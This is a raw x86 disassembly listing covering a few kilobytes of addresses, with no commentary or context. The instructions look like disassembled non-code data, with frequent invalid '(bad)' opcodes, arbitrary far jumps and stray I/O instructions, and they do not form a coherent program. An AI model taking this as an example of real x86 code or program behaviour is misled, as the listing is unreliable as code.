  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0xe08aee8c
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x20000001
  41fa8d:	retw   0xea18
  41fa91:	loop   0x41faed
  41fa93:	push   eax
  41fa94:	mov    ebp,DWORD PTR [edi+ecx*4-0xd]
  41fa98:	(bad)  
  41fa99:	mov    ds:0xda1ce571,al
  41fa9e:	adc    eax,0xad1cf6f9
  41faa3:	mov    bh,0x5c
  41faa5:	xchg   DWORD PTR [edx],edx
  41faa7:	jl     0x41fa62
  41faa9:	sub    edx,DWORD PTR [esi-0x39]
  41faac:	xchg   BYTE PTR [eax-0x38],ah
  41faaf:	sub    al,0x8b
  41fab1:	ret    0xcf00
  41fab4:	adc    cl,0x65
  41fab7:	mov    ds:0x3ca7d7d3,al
  41fabc:	pop    esp
  41fabd:	pop    esp
  41fabe:	jo     0x41fa40
  41fac0:	bound  esi,QWORD PTR [ebx+0x3a765077]
  41fac6:	clc    
  41fac7:	clc    
  41fac8:	inc    esi
  41fac9:	loope  0x41fac7
  41facb:	ins    BYTE PTR es:[edi],dx
  41facc:	mov    WORD PTR ds:0xac1e4197,cs
  41fad2:	aas    
  41fad3:	pop    esp
  41fad4:	jmp    0x4184:0x9d225379
  41fadb:	je     0x41fb0d
  41fadd:	fild   DWORD PTR [ebp-0x7313bc23]
  41fae3:	leave  
  41fae4:	loope  0x41fb2e
  41fae6:	cmp    dh,BYTE PTR [edi-0x73]
  41fae9:	add    DWORD PTR [edx+0x5081e9d5],edi
  41faef:	in     al,dx
  41faf0:	jno    0x41fb02
  41faf2:	sub    DWORD PTR [edi+ecx*4+0x60],edi
  41faf6:	or     eax,0x28fd7c32
  41fafb:	xchg   edi,eax
  41fafc:	xor    dl,ch
  41fafe:	data16 ja 0x41fb10
  41fb01:	push   ebp
  41fb02:	icebp  
  41fb03:	add    BYTE PTR es:[ebx+0x7a96ed60],bl
  41fb0a:	or     esp,DWORD PTR [ebx-0x18f5ef53]
  41fb10:	sub    DWORD PTR fs:[edx],ebx
  41fb13:	dec    ebp
  41fb14:	push   esp
  41fb15:	and    DWORD PTR [edx-0x4b926112],esp
  41fb1b:	add    ebp,DWORD PTR [ebp+0x356c4b5]
  41fb21:	push   esi
  41fb22:	sub    dh,BYTE PTR [edi-0x42]
  41fb25:	leave  
  41fb26:	pop    esp
  41fb27:	xchg   ebp,eax
  41fb28:	call   0xb99b52bd
  41fb2d:	mov    bl,0xd1
  41fb2f:	and    ebp,edi
  41fb31:	clc    
  41fb32:	repz mov al,BYTE PTR [ebx-0x37]
  41fb36:	stos   BYTE PTR es:[edi],al
  41fb37:	add    DWORD PTR fs:0x54de020c,0x322a1e4d
  41fb42:	and    al,0x6e
  41fb44:	cmc    
  41fb45:	xchg   ebp,eax
  41fb46:	pop    ecx
  41fb47:	in     eax,dx
  41fb48:	xor    al,0x32
  41fb4a:	cld    
  41fb4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb4c:	xchg   edi,eax
  41fb4d:	clc    
  41fb4e:	(bad)  
  41fb50:	push   esp
  41fb51:	stos   DWORD PTR es:[edi],eax
  41fb52:	jnp    0x41fbbf
  41fb54:	outs   dx,DWORD PTR ds:[esi]
  41fb55:	mov    bl,0xf3
  41fb57:	outs   dx,BYTE PTR ds:[esi]
  41fb58:	in     al,dx
  41fb59:	add    ch,ch
  41fb5b:	pop    edi
  41fb5c:	and    eax,0x9b60642
  41fb61:	add    BYTE PTR [ebx-0x7cbf97f5],ch
  41fb67:	xchg   esi,eax
  41fb68:	(bad)  
  41fb69:	(bad)  
  41fb6a:	repz push ss
  41fb6c:	dec    esp
  41fb6d:	xor    cl,ah
  41fb6f:	pusha  
  41fb70:	and    eax,0x7e67ada6
  41fb75:	outs   dx,BYTE PTR ds:[esi]
  41fb76:	fmul   st(6),st
  41fb78:	aas    
  41fb79:	mov    ch,0x80
  41fb7b:	ret    0x2111
  41fb7e:	jmp    0x2178:0xb1a65d41
  41fb85:	inc    edx
  41fb86:	js     0x41fbdb
  41fb88:	mov    ebx,0x385264e4
  41fb8d:	xor    cl,cl
  41fb8f:	out    0x9c,al
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	pop    ecx
  41fc01:	retf   
  41fc02:	dec    ebp
  41fc03:	(bad)  
  41fc04:	push   edx
  41fc05:	push   edx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0xb7000001
  41fc0d:	jle    0x41fbce
  41fc0f:	aas    
  41fc10:	mov    dh,0x43
  41fc12:	jmp    0x5d1:0x9546ecda
  41fc19:	xchg   DWORD PTR [ebp-0x26],ebp
  41fc1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc1d:	ret    0xdda5
  41fc20:	popa   
  41fc21:	ins    BYTE PTR es:[edi],dx
  41fc22:	pop    eax
  41fc23:	cdq    
  41fc24:	pop    ebx
  41fc25:	fst    DWORD PTR [ecx-0x7d]
  41fc28:	into   
  41fc29:	xlat   BYTE PTR gs:[ebx]
  41fc2b:	aad    0xca
  41fc2d:	push   ds
  41fc2e:	mov    cl,dh
  41fc30:	gs mov al,0xc3
  41fc33:	bnd jmp 0x48ba82bf
  41fc39:	mov    bl,0x0
  41fc3b:	out    0x1f,al
  41fc3d:	dec    eax
  41fc3e:	dec    esp
  41fc3f:	dec    edi
  41fc40:	jb     0x41fbdb
  41fc42:	mov    WORD PTR [esi],ss
  41fc44:	arpl   WORD PTR [ebp-0x66],dx
  41fc47:	lods   eax,DWORD PTR ds:[esi]
  41fc48:	loopne 0x41fc7a
  41fc4a:	fmul   st(3),st
  41fc4c:	imul   ebp,DWORD PTR [esp+eax*4+0x6594143d],0xffffffa5
  41fc54:	xor    al,0x6b
  41fc56:	dec    ebp
  41fc57:	or     eax,0x81c75451
  41fc5c:	call   0xfd2a:0xb5278a9
  41fc63:	popf   
  41fc64:	mov    cl,0xf
  41fc66:	sbb    al,0x6b
  41fc68:	in     eax,0xff
  41fc6a:	mov    dh,bl
  41fc6c:	mov    ?,edx
  41fc6e:	sbb    al,0x32
  41fc70:	je     0x41fc48
  41fc72:	jb     0x41fca7
  41fc74:	xchg   ebx,eax
  41fc75:	retf   
  41fc76:	inc    eax
  41fc77:	test   BYTE PTR [ecx],0x45
  41fc7a:	aaa    
  41fc7b:	aas    
  41fc7c:	mov    eax,ds:0xfef92d76
  41fc81:	jnp    0x41fcf0
  41fc83:	stos   BYTE PTR es:[edi],al
  41fc84:	shl    dh,0x6f
  41fc87:	sub    BYTE PTR [edx-0x6b],0x1e
  41fc8b:	xor    DWORD PTR [edi-0x7ce0e0b],esi
  41fc91:	xchg   edx,eax
  41fc92:	and    edx,esi
  41fc94:	clc    
  41fc95:	and    cl,BYTE PTR [ecx+0x1c]
  41fc98:	push   ds
  41fc99:	mov    al,0x43
  41fc9b:	jb     0x41fcdc
  41fc9d:	xchg   edi,eax
  41fc9e:	and    esi,ebp
  41fca0:	jne    0x41fd1f
  41fca2:	or     DWORD PTR [edi],edx
  41fca4:	std    
  41fca5:	iret   
  41fca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fca7:	test   DWORD PTR [ebx],esp
  41fca9:	mov    BYTE PTR [edi+0x386b79b9],dl
  41fcaf:	mov    ds:0x9ef9ac7e,eax
  41fcb4:	inc    ebp
  41fcb5:	sbb    bl,dh
  41fcb7:	stos   BYTE PTR es:[edi],al
  41fcb8:	fwait
  41fcb9:	scas   al,BYTE PTR es:[edi]
  41fcba:	test   DWORD PTR [esi-0x30cb250b],ebp
  41fcc0:	repz push ebx
  41fcc2:	mov    bl,0xc2
  41fcc4:	iret   
  41fcc5:	cwde   
  41fcc6:	inc    ebx
  41fcc7:	nop
  41fcc8:	fs mov dl,0x58
  41fccb:	nop
  41fccc:	adc    eax,0x7a25be6c
  41fcd1:	outs   dx,DWORD PTR ds:[esi]
  41fcd2:	test   eax,0xfd82ae2c
  41fcd7:	mov    ecx,0x847e1ae6
  41fcdc:	fld1   
  41fcde:	fisub  WORD PTR [eax+ecx*4+0x7c]
  41fce2:	addr16 mov al,ds:0x66a0
  41fce6:	iret   
  41fce7:	cmp    edx,DWORD PTR [eax]
  41fce9:	jmp    0x8cf1d2a3
  41fcee:	ss test ah,ch
  41fcf1:	dec    eax
  41fcf2:	push   edi
  41fcf3:	lea    eax,[ebx+0x4ccb3226]
  41fcf9:	xor    ecx,esi
  41fcfb:	adc    ch,BYTE PTR [esi]
  41fcfd:	xor    BYTE PTR [ebx+0x4e904566],dh
  41fd03:	xchg   ebp,eax
  41fd04:	and    bl,ah
  41fd06:	pop    eax
  41fd07:	inc    esi
  41fd08:	mov    dl,0xd1
  41fd0a:	cmp    dl,BYTE PTR [eax]
  41fd0c:	mov    ds:0x8d073b83,eax
	...
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	adc    al,0xb0
  41fd82:	mov    eax,0x15357da
  41fd87:	add    BYTE PTR ds:0xce000001,al
  41fd8d:	(bad)  
  41fd8e:	gs cdq 
  41fd90:	push   esp
  41fd91:	idiv   DWORD PTR [ebx+ebp*4-0x34]
  41fd95:	nop
  41fd96:	(bad)  
  41fd97:	gs loop 0x41fd44
  41fd9a:	rcl    bl,cl
  41fd9c:	xor    al,0x4
  41fd9e:	es jo  0x41fd8c
  41fda1:	pop    eax
  41fda2:	fiadd  DWORD PTR [ecx-0x5e]
  41fda5:	xchg   esp,eax
  41fda6:	dec    eax
  41fda7:	add    ebx,edi
  41fda9:	sbb    BYTE PTR [eax+0x62],dl
  41fdac:	pop    ds
  41fdad:	or     esp,edx
  41fdaf:	pop    ebp
  41fdb0:	xchg   edx,eax
  41fdb1:	inc    ebx
  41fdb2:	xor    ebp,DWORD PTR [esi-0x1b517919]
  41fdb8:	in     al,0x4d
  41fdba:	(bad)  [ebx+0x4a]
  41fdbd:	mov    eax,0x9a11bd32
  41fdc2:	retf   
  41fdc3:	xor    eax,0x8ec4f74b
  41fdc8:	pusha  
  41fdc9:	jle    0x41fdbf
  41fdcb:	sbb    bl,bl
  41fdcd:	jl     0x41fe2b
  41fdcf:	dec    edi
  41fdd0:	(bad)  
  41fdd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdd2:	add    bh,BYTE PTR [eax-0x39ee85f8]
  41fdd8:	aas    
  41fdd9:	sub    BYTE PTR ds:0x1294e3a7,dh
  41fddf:	xor    al,0x14
  41fde1:	mov    DWORD PTR [eax-0x5a],edi
  41fde4:	xchg   edx,eax
  41fde5:	or     DWORD PTR [edi+0x79],ebx
  41fde8:	int    0x50
  41fdea:	mov    dh,0x37
  41fdec:	xchg   ebx,eax
  41fded:	jmp    0xa74512f1
  41fdf2:	sti    
  41fdf3:	sti    
  41fdf4:	cli    
  41fdf5:	ficomp DWORD PTR [ecx-0x6005fecc]
  41fdfb:	sbb    esi,DWORD PTR [edx-0x58]
  41fdfe:	popa   
  41fdff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe00:	sti    
  41fe01:	call   0xe395ba2d
  41fe06:	bnd je 0x41fe37
  41fe09:	sbb    BYTE PTR [ecx-0xfac73d5],0xfe
  41fe10:	outs   dx,BYTE PTR ds:[esi]
  41fe11:	jae    0x41fe5a
  41fe13:	push   ebx
  41fe14:	lea    esp,[ecx-0x572c3d5]
  41fe1a:	repnz cs mov esp,0x8271374f
  41fe21:	ret    
  41fe22:	fwait
  41fe23:	adc    al,0x62
  41fe25:	mov    al,BYTE PTR [edi-0x11d468cb]
  41fe2b:	or     DWORD PTR [esi],esp
  41fe2d:	retf   
  41fe2e:	dec    edi
  41fe2f:	add    DWORD PTR [eax-0x62d769c0],edx
  41fe35:	xor    al,0x96
  41fe37:	ins    BYTE PTR es:[edi],dx
  41fe38:	out    dx,eax
  41fe39:	mov    DWORD PTR [eax],ebx
  41fe3b:	inc    ebx
  41fe3c:	lods   al,BYTE PTR ds:[esi]
  41fe3d:	mov    ds:0xf3f4f6ee,eax
  41fe42:	push   ebp
  41fe43:	ficomp DWORD PTR [edi+0x6d]
  41fe46:	pop    ebp
  41fe47:	xor    ah,al
  41fe49:	adc    eax,0x39d8779d
  41fe4e:	xchg   esp,eax
  41fe4f:	outs   dx,BYTE PTR ds:[esi]
  41fe50:	out    0x7e,al
  41fe52:	fisub  DWORD PTR [ebp-0x5875e651]
  41fe58:	dec    ebp
  41fe59:	leave  
  41fe5a:	bound  eax,QWORD PTR [esi+0x7cebaf1b]
  41fe60:	ror    DWORD PTR [edx],0x9
  41fe63:	shl    eax,1
  41fe65:	pop    es
  41fe66:	int3   
  41fe67:	mov    ecx,0xc914e9cb
  41fe6c:	mov    WORD PTR [ebp+0x17f7cea0],?
  41fe72:	aaa    
  41fe73:	cmp    ecx,eax
  41fe75:	xor    BYTE PTR ds:0x3872692,bh
  41fe7b:	repz out dx,eax
  41fe7d:	adc    esi,DWORD PTR [esi]
  41fe7f:	in     eax,dx
  41fe80:	xlat   BYTE PTR ds:[ebx]
  41fe81:	xor    al,0x64
  41fe83:	cs or  al,0xbb
  41fe86:	push   es
  41fe87:	add    ah,BYTE PTR [ebp-0x5e]
  41fe8a:	pop    esp
  41fe8b:	ret    
  41fe8c:	ss pop es
  41fe8e:	xchg   ecx,eax
  41fe8f:	lds    ebx,FWORD PTR [ecx]
	...
  41fef1:	add    BYTE PTR [eax],al
  41fef3:	add    BYTE PTR [edx-0x1865ab],ch
  41fef9:	out    dx,eax
  41fefa:	call   FWORD PTR [ebp-0x5]
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xd7
  41ff01:	clc    
  41ff02:	jl     0x41fea3
  41ff04:	pop    esp
  41ff05:	push   esp
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    eax,0xbd000001
  41ff0d:	outs   dx,DWORD PTR ds:[esi]
  41ff0e:	add    edi,DWORD PTR [ebp+edi*2+0x70]
  41ff12:	ja     0x41ff6b
  41ff14:	mov    edi,0x9dfe89f4
  41ff19:	shl    BYTE PTR [esi+0x2e980e64],0xbb
  41ff20:	pop    edx
  41ff21:	sub    esi,DWORD PTR [ebx]
  41ff23:	sbb    DWORD PTR [edi-0x73],0xa293deb5
  41ff2a:	into   
  41ff2b:	or     eax,esi
  41ff2d:	cmp    BYTE PTR [ecx-0x2b],dl
  41ff30:	es loop 0x41ff34
  41ff33:	or     al,0xa6
  41ff35:	jmp    0x41feb7
  41ff37:	sbb    DWORD PTR [edx+0x43],ebp
  41ff3a:	jo     0x41ff3b
  41ff3c:	add    ch,BYTE PTR [ebp+eiz*4+0x1a3c64d9]
  41ff43:	xlat   BYTE PTR ds:[ebx]
  41ff44:	retf   
  41ff45:	push   ds
  41ff46:	xchg   edx,eax
  41ff47:	retf   0x835b
  41ff4a:	nop
  41ff4b:	sbb    eax,0x94f9bd43
  41ff50:	fist   DWORD PTR [ebx-0x64e442c8]
  41ff56:	xor    ecx,ebp
  41ff58:	push   DWORD PTR [eax+0x50e30a65]
  41ff5e:	adc    cl,BYTE PTR [ecx-0x19d83b71]
  41ff64:	xchg   bl,al
  41ff66:	shl    dl,cl
  41ff68:	pop    esi
  41ff69:	lahf   
  41ff6a:	cmp    al,0x88
  41ff6c:	jo     0x41ff2b
  41ff6e:	jmp    0x41ff1c
  41ff70:	mov    eax,0xf7f73c00
  41ff75:	inc    esp
  41ff76:	test   al,0x2c
  41ff78:	lds    eax,FWORD PTR [ebx-0x54]
  41ff7b:	pushf  
  41ff7c:	scas   eax,DWORD PTR es:[edi]
  41ff7d:	shl    DWORD PTR [edx-0x2f2dd645],cl
  41ff83:	and    al,0x56
  41ff85:	(bad)  
  41ff87:	nop
  41ff88:	cmp    dl,ch
  41ff8a:	lock (bad) 
  41ff8c:	xchg   ecx,eax
  41ff8d:	cdq    
  41ff8e:	test   DWORD PTR [ebp+0x7a703ba3],esi
  41ff94:	inc    ebp
  41ff95:	mov    esi,0xc45cc4ab
  41ff9a:	sti    
  41ff9b:	inc    esi
  41ff9c:	jmp    0x41ff92
  41ff9e:	(bad)  
  41ff9f:	xchg   ebx,eax
  41ffa0:	rcl    dl,cl
  41ffa2:	inc    ebx
  41ffa3:	mov    edx,0x2340682a
  41ffa8:	xchg   ebx,eax
  41ffa9:	retf   0xff6e
  41ffac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffad:	rol    BYTE PTR [edx+0x5babe6d7],cl
  41ffb3:	or     dh,bl
  41ffb5:	outs   dx,BYTE PTR ds:[esi]
  41ffb6:	ins    DWORD PTR es:[edi],dx
  41ffb7:	jnp    0x41ffaf
  41ffb9:	mov    esi,0xb9713758
  41ffbe:	add    DWORD PTR [eax+ebp*4-0x1fb16eb5],0xbdb69d21
  41ffc9:	(bad)  
  41ffcb:	xchg   esp,eax
  41ffcc:	call   0xa79b:0x9103fb48
  41ffd3:	or     esp,DWORD PTR [esi+0x7]
  41ffd6:	pop    esp
  41ffd7:	inc    ebx
  41ffd8:	jmp    0xe9ab:0x4e9d855e
  41ffdf:	cs loopne 0x42001c
  41ffe2:	sbb    dl,ah
  41ffe4:	and    eax,0xc7709376
  41ffe9:	outs   dx,DWORD PTR ds:[esi]
  41ffea:	stos   BYTE PTR es:[edi],al
  41ffeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffec:	pop    esp
  41ffed:	stc    
  41ffee:	mov    al,ds:0x834be1d
  41fff3:	push   ebp
  41fff4:	lahf   
  41fff5:	std    
  41fff6:	ja     0x420002
  41fff8:	arpl   WORD PTR [esi],bp
  41fffa:	push   0x538cbbe5
  41ffff:	xchg   ebx,eax
  420000:	pushf  
  420001:	lea    edx,[ebx]
  420003:	push   ecx
  420004:	cmp    ecx,edi
  420006:	cmp    bl,BYTE PTR [ebx-0x1966c319]
  42000c:	repz and bp,WORD PTR [ebp+esi*4+0x0]
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x5
  420081:	stos   DWORD PTR es:[edi],eax
  420082:	in     eax,dx
  420083:	lea    esp,[ecx+0x55]
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0x9a000001
  42008d:	cld    
  42008e:	(bad)  [edi]
  420090:	sbb    al,0xf3
  420092:	push   ss
  420093:	push   0xffffff9a
  420095:	cmp    eax,0x4808cae0
  42009a:	addr16 cld 
  42009c:	xchg   edx,eax
  42009d:	lahf   
  42009e:	call   0x418a4533
  4200a3:	std    
  4200a4:	adc    ah,BYTE PTR [esi-0x19]
  4200a7:	push   edx
  4200a8:	inc    ebx
  4200a9:	shr    BYTE PTR [ecx-0x24],cl
  4200ac:	fisubr WORD PTR [edi-0x1380f0eb]
  4200b2:	retf   
  4200b3:	jge    0x4200a7
  4200b5:	inc    edi
  4200b6:	push   edx
  4200b7:	mov    cl,0x82
  4200b9:	ret    0xfd63
  4200bc:	test   eax,0x1a4eec03
  4200c1:	lods   al,BYTE PTR ds:[esi]
  4200c2:	fcos   
  4200c4:	mov    cl,0x94
  4200c6:	fcmovnu st,st(2)
  4200c8:	dec    ebp
  4200c9:	xchg   ecx,eax
  4200ca:	push   ecx
  4200cb:	jo     0x42014a
  4200cd:	adc    DWORD PTR [edx-0x71],0xffffffbe
  4200d1:	popa   
  4200d2:	mov    esp,0x29323d87
  4200d7:	ins    BYTE PTR es:[edi],dx
  4200d8:	jge    0x420155
  4200da:	or     DWORD PTR [edi],ebx
  4200dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200dd:	inc    ebp
  4200de:	cmp    al,BYTE PTR [ecx]
  4200e0:	and    ch,BYTE PTR [ebx+0x3bb7b74]
  4200e6:	(bad)  [edi-0x589ef3f]
  4200ec:	in     eax,0x1e
  4200ee:	das    
  4200ef:	cmp    BYTE PTR [ebp-0x6af8bbd7],al
  4200f5:	mov    ebp,0x62edbb51
  4200fa:	pop    ebx
  4200fb:	mov    ds:0x3e47638f,al
  420100:	ror    DWORD PTR [eax+0x34e2acca],cl
  420106:	xchg   DWORD PTR [esp+ebx*4-0x48],eax
  42010a:	lahf   
  42010b:	push   es
  42010c:	sar    DWORD PTR ss:[edx],cl
  42010f:	sub    ebx,DWORD PTR [edi]
  420111:	pop    ecx
  420112:	push   cs
  420113:	call   0x109b:0xb51ef4d8
  42011a:	push   edi
  42011b:	mov    ebx,0x68ef643c
  420120:	mov    esi,0xfeffb8d6
  420125:	out    0xe1,eax
  420127:	dec    edi
  420128:	xor    DWORD PTR [ecx+0xcbf0504],edx
  42012e:	pusha  
  42012f:	add    edi,DWORD PTR [ebp+0x6b]
  420132:	mov    ah,0xec
  420134:	jmp    0x4fe4:0x29e0702c
  42013b:	and    edi,ecx
  42013d:	pushf  
  42013e:	inc    ebx
  42013f:	dec    edi
  420140:	stos   BYTE PTR es:[edi],al
  420141:	cli    
  420142:	push   esp
  420143:	jbe    0x4201c0
  420145:	fsubr  QWORD PTR [edx-0x48c5468f]
  42014b:	cs pop edx
  42014d:	jb     0x420109
  42014f:	pop    ecx
  420150:	sub    edi,DWORD PTR [ebx+0x38]
  420153:	aad    0x94
  420155:	push   es
  420156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420157:	and    eax,0x6f954c
  42015c:	jmp    0x90f10445
  420161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420162:	jle    0x420136
  420164:	popa   
  420165:	ins    BYTE PTR es:[edi],dx
  420166:	push   0x2c
  420168:	neg    BYTE PTR [ebx-0x4bd5188f]
  42016e:	fcomp  DWORD PTR [edi+0x37]
  420171:	mov    ah,0x59
  420173:	mov    eax,ds:0x41e69888
  420178:	adc    DWORD PTR [ecx+edx*8-0x56],ebx
  42017c:	and    cl,BYTE PTR [edx+ecx*1]
  42017f:	das    
  420180:	outs   dx,BYTE PTR ds:[esi]
  420181:	inc    edx
  420182:	outs   dx,BYTE PTR cs:[esi]
  420184:	mov    ds:0x6e4c96e2,eax
  420189:	in     eax,dx
  42018a:	das    
  42018b:	cwde   
  42018c:	pop    esi
  42018d:	mov    esi,0x9f8848
	...
  4201f2:	add    BYTE PTR [eax],al
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x5d9ba717],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0xfa000001
  42020d:	mov    WORD PTR [edi+0x77],fs
  420210:	xchg   ebp,eax
  420211:	xor    BYTE PTR [edx+0x3b359450],ah
  420217:	pop    esi
  420218:	ss adc eax,0xccacbcf6
  42021e:	and    BYTE PTR [esi+0x7f],cl
  420221:	aaa    
  420222:	fwait
  420223:	xor    al,BYTE PTR [ecx+0x2b2caa8b]
  420229:	xchg   BYTE PTR [edi-0x7b],bh
  42022c:	inc    edi
  42022d:	dec    esi
  42022e:	mov    esp,0x6f35cfb4
  420233:	mov    bl,0x46
  420235:	cmp    BYTE PTR [edi-0x56],0x59
  420239:	xor    eax,0xf90a96fd
  42023e:	shr    BYTE PTR [bp+si],0x5b
  420242:	dec    ecx
  420243:	mov    ebx,ecx
  420245:	sub    al,0x7c
  420247:	mov    DWORD PTR ds:[ecx-0x67639dc2],ebp
  42024e:	retf   0x2f4f
  420251:	adc    BYTE PTR [edi],cl
  420253:	adc    ah,BYTE PTR [edi]
  420255:	ds adc al,0x22
  420258:	add    eax,0xc419ff4c
  42025d:	(bad)  
  42025e:	jmp    0x4202a2
  420260:	data16 je 0x42028c
  420263:	mov    ebp,0x46915f30
  420268:	jl     0x420214
  42026a:	sub    BYTE PTR [edx],ch
  42026c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42026d:	call   0x21866445
  420272:	scas   eax,DWORD PTR es:[edi]
  420273:	inc    edx
  420274:	cwde   
  420275:	mov    bh,0x82
  420277:	scas   eax,DWORD PTR es:[edi]
  420278:	adc    edi,0x4
  42027b:	fdiv   DWORD PTR [edx]
  42027d:	xor    ebp,ebx
  42027f:	sub    DWORD PTR [esi],ebp
  420281:	dec    edi
  420282:	fisubr WORD PTR [ebp+edi*8-0x6f]
  420286:	stc    
  420287:	call   0x1f47:0x1d247d67
  42028e:	mov    edx,0x2f40b044
  420293:	ins    BYTE PTR es:[edi],dx
  420294:	or     eax,0x6b7e9f88
  420299:	inc    esp
  42029a:	push   ds
  42029b:	mov    ah,0xdd
  42029d:	cwde   
  42029e:	leave  
  42029f:	or     eax,0x8d011196
  4202a4:	xchg   esp,eax
  4202a5:	nop
  4202a6:	test   BYTE PTR [ecx],0x3a
  4202a9:	sub    eax,0x924a6d5f
  4202ae:	in     eax,0x94
  4202b0:	fist   WORD PTR ds:0x27b042ac
  4202b6:	mov    bl,0xf0
  4202b8:	mov    ebx,0x1f71d6e7
  4202bd:	or     BYTE PTR [eax+0x14],dl
  4202c0:	sahf   
  4202c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202c2:	push   es
  4202c3:	ret    
  4202c4:	or     al,0xab
  4202c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202c7:	inc    ebx
  4202c8:	shr    DWORD PTR [edi+0x18c6221b],0x63
  4202cf:	dec    ebp
  4202d0:	call   0xa2e318cd
  4202d5:	add    dl,BYTE PTR [eax-0x602685f1]
  4202db:	aam    0xee
  4202dd:	sbb    bh,BYTE PTR [edx+edi*1]
  4202e0:	fldcw  WORD PTR [edi]
  4202e2:	rcr    DWORD PTR [esi],1
  4202e4:	repz fld TBYTE PTR [ecx-0x13]
  4202e8:	add    BYTE PTR [eax-0x7e],al
  4202eb:	jnp    0x420290
  4202ed:	pop    edi
  4202ee:	inc    eax
  4202ef:	cmp    eax,0xf1402ecd
  4202f4:	sub    DWORD PTR [edx],ecx
  4202f6:	inc    eax
  4202f7:	mov    al,ds:0x19b20924
  4202fc:	sub    DWORD PTR [ecx+0x527b1c20],ebx
  420302:	sub    dl,al
  420304:	jnp    0x4202a4
  420306:	xor    DWORD PTR [esi+0x2a7b7bed],ebp
  42030c:	mov    edx,0x49a1de99
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	sub    eax,0x6bf4a3ec
  420385:	push   edi
  420386:	add    DWORD PTR [eax],eax
  420388:	add    eax,0x4b000001
  42038d:	or     eax,0x5c5e283f
  420392:	fsubrp st(2),st
  420394:	mov    fs,esi
  420396:	in     al,dx
  420397:	and    bl,BYTE PTR [edx+0x1b]
  42039a:	std    
  42039b:	loope  0x4203d4
  42039d:	sti    
  42039e:	mov    ah,0x1b
  4203a0:	dec    edi
  4203a1:	jnp    0x420350
  4203a3:	sbb    dh,dh
  4203a5:	(bad)  
  4203a6:	xchg   edx,eax
  4203a7:	pop    esp
  4203a8:	lods   al,BYTE PTR ds:[esi]
  4203a9:	inc    eax
  4203aa:	pop    esi
  4203ab:	mov    dl,0xf3
  4203ad:	sbb    ecx,DWORD PTR [esi]
  4203af:	fwait
  4203b0:	outs   dx,DWORD PTR ds:[esi]
  4203b1:	and    DWORD PTR [ecx-0x6f],edx
  4203b4:	jg     0x41a66c8a
  4203ba:	or     esp,DWORD PTR [edi]
  4203bc:	push   esp
  4203bd:	sbb    edx,DWORD PTR [ecx-0x1fd5dbfa]
  4203c3:	cmp    DWORD PTR [ecx],0xab90faf0
  4203c9:	jae    0x420436
  4203cb:	xlat   BYTE PTR ds:[ebx]
  4203cc:	ds add eax,0x8705201f
  4203d2:	aad    0x1d
  4203d4:	retf   0xdf6a
  4203d7:	push   esp
  4203d8:	push   ds
  4203d9:	xor    esi,DWORD PTR [eax+0xda7064b]
  4203df:	adc    ebp,edx
  4203e1:	jns    0x420447
  4203e3:	scas   al,BYTE PTR es:[edi]
  4203e4:	lods   al,BYTE PTR ds:[esi]
  4203e5:	in     al,dx
  4203e6:	dec    esi
  4203e7:	jbe    0x420392
  4203e9:	sub    eax,0x980811a7
  4203ee:	pop    esp
  4203ef:	sub    DWORD PTR [esi],edx
  4203f1:	sbb    bl,ch
  4203f3:	lods   eax,DWORD PTR ds:[esi]
  4203f4:	out    dx,eax
  4203f5:	pop    esp
  4203f6:	push   ebp
  4203f7:	in     al,0xf4
  4203f9:	int    0x5c
  4203fb:	add    DWORD PTR [eax],ecx
  4203fd:	or     eax,0x867d2925
  420402:	adc    DWORD PTR [edx],ebp
  420404:	xor    al,0x99
  420406:	inc    ebx
  420407:	push   ss
  420408:	in     eax,dx
  420409:	sub    dl,BYTE PTR [esi+0x31]
  42040c:	nop
  42040d:	xchg   ecx,eax
  42040e:	cmp    esp,edi
  420410:	bound  esp,QWORD PTR [ebp+0x6cc9988]
  420416:	jo     0x4203f1
  420418:	ds ja  0x42048a
  42041b:	out    0x2f,al
  42041d:	mov    ah,0x18
  42041f:	pop    ss
